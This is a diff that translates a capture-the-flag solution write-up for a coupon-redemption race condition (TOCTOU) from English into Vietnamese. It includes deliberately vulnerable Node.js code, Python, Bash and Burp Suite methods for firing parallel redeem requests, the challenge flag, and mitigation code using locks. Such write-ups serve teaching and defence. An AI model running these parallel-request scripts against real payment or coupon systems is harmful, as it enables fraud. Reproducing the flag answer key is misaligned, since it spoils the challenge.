@@ -1,46 +1,49 @@
-# Challenge 16: RaceCondition - Solution
+# Thử thách 16: RaceCondition - Giải pháp
 
-## Vulnerability Type
-**Race Condition / Time-of-Check Time-of-Use (TOCTOU)**
+## Loại lỗ hổng
+**Race Condition / Time-of-Check to Time-of-Use (TOCTOU)** 
+*(Điều kiện tương tranh / Lỗi thời điểm kiểm tra so với thời điểm sử dụng)*
 
-## Description
-The coupon redemption has a check-then-act race condition with an artificial delay, allowing multiple simultaneous requests to bypass the "already redeemed" check.
+## Mô tả
+Tính năng đổi mã giảm giá (redeem coupon) sử dụng logic "Kiểm tra trước - Thực thi sau" (Check-then-act) nhưng lại dính một độ trễ nhất định. Điều này tạo ra một cửa sổ thời gian (race window) cho phép hacker gửi hàng loạt request cùng một lúc, bypass qua bước kiểm tra trạng thái "đã đổi" và cộng dồn số tiền lên nhiều lần.
 
-## Vulnerable Code
+## Mã nguồn chứa lỗ hổng
 ```javascript
 // VULNERABLE: check-then-act race condition (no mutex)
 app.post('/redeem', async (req,res) => {
   const acc = getAccount(req.session.id_key);
+  // Time of check
   if (acc.redeemed) {
     return res.redirect('/');
   }
-  // Artificial delay simulating DB operation - race window
+  // Giả lập độ trễ (mô phỏng DB xử lý chậm) - Tạo ra Race Window
   await new Promise(r => setTimeout(r, 50));
+  
+  // Time of use
   acc.redeemed = true;
   acc.balance += 50;
 ```
 
-## Exploitation Steps
+## Khai thác (Exploit)
 
-### Step 1: Understand the Goal
-- You start with $100
-- Each account gets ONE $50 coupon
-- The FLAG costs $200
-- You need to redeem the coupon multiple times
+### Bước 1: Phân tích mục tiêu
+- Khởi điểm bạn có $100.
+- Tài khoản của bạn có một Coupon trị giá $50.
+- FLAG có giá $200.
+- Bạn cần một cách nào đó để đổi (redeem) duy nhất 1 coupon này thành ít nhất $100 nữa.
 
-### Step 2: Exploit the Race Condition
-The vulnerability exists in the 50ms delay between checking `acc.redeemed` and setting it to `true`. If we send multiple requests simultaneously, they all pass the check before any of them sets the flag.
+### Bước 2: Tấn công Race Condition
+Lỗ hổng nằm ở quãng chờ 50ms giữa lệnh `if (acc.redeemed)` và `acc.redeemed = true`. Nếu bạn gửi cùng lúc 5 HTTP POST request trong cùng một khoảnh khắc, cả 5 request này sẽ cùng vượt qua hàm `if` (vì lúc này cờ `redeemed` vẫn là `false`), sau đó cả 5 tiến trình cùng chờ 50ms và cuối cùng là cộng dồn 5 lần $50 vào tài khoản.
 
-### Method 1: Using Browser (Manual)
-1. Open the application in your browser
-2. Open Developer Tools (F12) → Network tab
-3. Click "Redeem $50 Coupon"
-4. Right-click the POST request → Copy as cURL
-5. Open multiple terminal windows
-6. Paste and execute the cURL command simultaneously in all windows
-7. Refresh the page to see increased balance
+### Cách 1: Sử dụng Browser (Thủ công)
+1. Mở trang web và bật DevTools (F12) → tab Network.
+2. Bấm "Redeem $50 Coupon".
+3. Nhấp chuột phải vào POST request ở tab Network → Copy as cURL.
+4. Mở 5 terminal lên cạnh nhau.
+5. Dán lệnh cURL vào cả 5 terminal và ấn Enter đồng loạt (càng nhanh càng tốt).
+6. Tải lại trang web và kiểm tra số dư.
 
-### Method 2: Using Python Script
+### Cách 2: Sử dụng Script Python (Gửi luồng song song)
 ```python
 import requests
 import threading
@@ -48,13 +51,13 @@ import threading
 url = "http://[host]/redeem"
 session = requests.Session()
 
-# Login first to get session
+# Đăng nhập lấy session cookie
 session.get("http://[host]/")
 
 def redeem():
     session.post(url)
 
-# Send 5 simultaneous requests
+# Gửi 5 request đồng thời bằng Multi-threading
 threads = []
 for i in range(5):
     t = threading.Thread(target=redeem)
@@ -64,66 +67,59 @@ for i in range(5):
 for t in threads:
     t.join()
 
-print("Check your balance!")
+print("Hoàn tất! Hãy tải lại trang để xem số dư.")
 ```
 
-### Method 3: Using Burp Suite Repeater
-1. Capture the `/redeem` POST request in Burp
-2. Send to Repeater
-3. Create multiple tabs (Ctrl+R multiple times)
-4. Click "Send" on all tabs as quickly as possible
-5. Or use Burp Intruder with null payloads and parallel threads
+### Cách 3: Sử dụng Burp Suite
+1. Bắt HTTP POST request `/redeem` qua Burp Proxy.
+2. Ném request sang **Repeater**.
+3. Duplicate tab Repeater ra thành 5 tab.
+4. Bấm "Send" liên tục trên 5 tab. 
+5. Hoặc dùng Burp Intruder cấu hình số Threads cao với Payload dạng Null payloads để đấm (fuzz) liên tục.
 
-### Method 4: Using curl in Bash
+### Cách 4: Sử dụng Bash + cURL
 ```bash
 #!/bin/bash
-# Get session cookie first
+# Trích xuất session cookie
 COOKIE=$(curl -c - http://[host]/ | grep session | awk '{print $7}')
 
-# Send 5 parallel requests
+# Khởi chạy 5 process curl dưới nền (background) để tranh quyền
 for i in {1..5}; do
   curl -b "session=$COOKIE" -X POST http://[host]/redeem &
 done
 wait
 
-echo "Done! Check your balance"
+echo "Hoàn thành!"
 ```
 
-### Step 3: Buy the Flag
-1. After successfully exploiting the race condition, your balance should be $200+
-2. Click "Buy FLAG ($200)"
-3. The flag will be displayed
+### Bước 3: Mua Flag
+1. Khi tấn công thành công, tài khoản bạn sẽ nổ tung lên số dư >$200.
+2. Ấn nút mua FLAG.
+3. Chờ Flag xuất hiện trên màn hình.
 
 ## Flag
 ```
 FCTF{r4c3_c0nd1t10n_d0ubl3_sp3nd}
 ```
 
-## How It Works
-1. Multiple requests arrive simultaneously
-2. All requests pass the `if (acc.redeemed)` check (still false)
-3. All requests wait 50ms
-4. All requests set `acc.redeemed = true` and add $50
-5. Result: coupon redeemed multiple times
-
-## Timing Diagram
-```
-Request 1: Check (false) → Wait 50ms → Set true, Add $50
-Request 2: Check (false) → Wait 50ms → Set true, Add $50
-Request 3: Check (false) → Wait 50ms → Set true, Add $50
-           ↑ All check before any set
+## Sơ đồ thời gian (Timeline)
+```text
+Request 1: Kiểm tra (false) → Chờ 50ms → Gán true, Cộng $50
+Request 2: Kiểm tra (false) → Chờ 50ms → Gán true, Cộng $50
+Request 3: Kiểm tra (false) → Chờ 50ms → Gán true, Cộng $50
+           ↑ Tất cả lọt qua vòng kiểm tra trước khi bị gán 'true'
 ```
 
-## Mitigation
-- Use atomic operations or database transactions
-- Implement proper locking mechanisms:
+## Biện pháp phòng ngừa (Mitigation)
+- Sử dụng các hoạt động mang tính nguyên tử (Atomic operations) ở cấp cơ sở dữ liệu.
+- Thiết lập cơ chế Khóa (Mutex / Lock):
   ```javascript
   const locks = new Map();
   
   app.post('/redeem', async (req,res) => {
     const key = req.session.id_key;
-    if (locks.get(key)) return res.redirect('/');
-    locks.set(key, true);
+    if (locks.get(key)) return res.redirect('/'); // Khóa đang bị chiếm
+    locks.set(key, true); // Khóa lại
     
     try {
       const acc = getAccount(key);
@@ -132,12 +128,11 @@ Request 3: Check (false) → Wait 50ms → Set true, Add $50
       acc.redeemed = true;
       acc.balance += 50;
     } finally {
-      locks.delete(key);
+      locks.delete(key); // Nhả khóa
     }
     res.redirect('/');
   });
   ```
-- Use database-level constraints (UNIQUE constraint on redemption)
-- Implement optimistic locking with version numbers
-- Use Redis or similar for distributed locks
-- Apply idempotency keys for critical operations
+- Cấu hình khóa Database (Optimistic Locking hoặc Pessimistic Locking).
+- Dùng Redis để cấp khóa phân tán (Distributed Lock) trong hệ thống Microservices.
+- Gắn Unique Constraint lên bảng Database để cấm việc nạp mã hai lần.
